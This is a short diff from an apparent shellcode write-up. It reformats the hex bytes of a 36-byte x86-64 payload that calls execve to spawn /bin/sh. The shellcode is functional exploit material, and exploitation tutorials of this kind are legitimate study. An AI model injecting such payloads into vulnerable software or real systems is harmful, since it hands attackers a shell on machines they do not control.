@@ -11,5 +11,5 @@ Finally, I make the syscall using the paramaters I had set.
 
 
 The total size of my code is 36 bytes: 
-4831c048bf2f2f62696e2f736848c1ef08574889e74831c0504889e6504889e2b03b0f05
+48 31 c0 48 bf 2f 2f 62 69 6e 2f 73 68 48 c1 ef 08 57 48 89 e7 48 31 c0 50 48 89 e6 50 48 89 e2 b0 3b 0f 05
 
